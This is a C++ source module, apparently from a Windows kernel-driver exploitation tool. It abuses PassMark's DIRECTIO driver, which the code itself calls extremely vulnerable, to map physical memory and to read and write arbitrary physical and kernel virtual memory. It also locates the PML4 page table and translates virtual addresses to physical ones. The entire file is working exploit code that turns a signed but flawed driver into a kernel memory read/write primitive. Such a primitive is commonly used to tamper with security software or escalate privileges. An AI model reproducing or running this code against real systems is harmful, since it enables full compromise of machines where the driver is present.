/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       DIRECTIO64.CPP
*
*  VERSION:     1.27
*
*  DATE:        12 Nov 2022
*
*  PassMark DIRECTIO driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/directio64.h"

//
// PassMark's DIRECTIO interface.
// 
// N.B. This driver itself is *extremely* vulnerable/bugged.
//

/*
* DI64MapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID DI64MapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* AllocatedMdl,
    _In_ BOOLEAN MapForWrite)
{
    DIRECTIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *AllocatedMdl = NULL;

    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    ULONG mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = mapSize;
    request.Offset.QuadPart = offset;
    request.Writeable = MapForWrite;

    if (supCallDriver(DeviceHandle,
        IOCTL_DIRECTIO_MAP_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request))) 
    {
        *SectionHandle = request.SectionHandle;
        *AllocatedMdl = request.AllocatedMdl;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* DI64UnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID DI64UnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID AllocatedMdl
)
{
    DIRECTIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.AllocatedMdl = AllocatedMdl;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        IOCTL_DIRECTIO_UNMAP_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* DI64QueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI DI64QueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    ULONG cbRead = 0x100000;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)DI64MapMemory(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle,
        &refObject,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        DI64UnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);

    }

    return (PML4 != 0);
}

/*
* DI64ReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI DI64ReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    PVOID allocMdl = NULL;
    HANDLE sectionHandle = NULL;

    ULONG_PTR offset;

    mappedSection = DI64MapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &allocMdl,
        DoWrite);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        DI64UnmapMemory(DeviceHandle,
            mappedSection,
            sectionHandle,
            allocMdl);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* DI64ReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI DI64ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return DI64ReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* DI64WritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI DI64WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return DI64ReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* DI64VirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI DI64VirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        DI64QueryPML4Value,
        DI64ReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* DI64ReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI DI64ReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = DI64VirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* DI64WriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI DI64WriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = DI64VirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = DI64ReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}
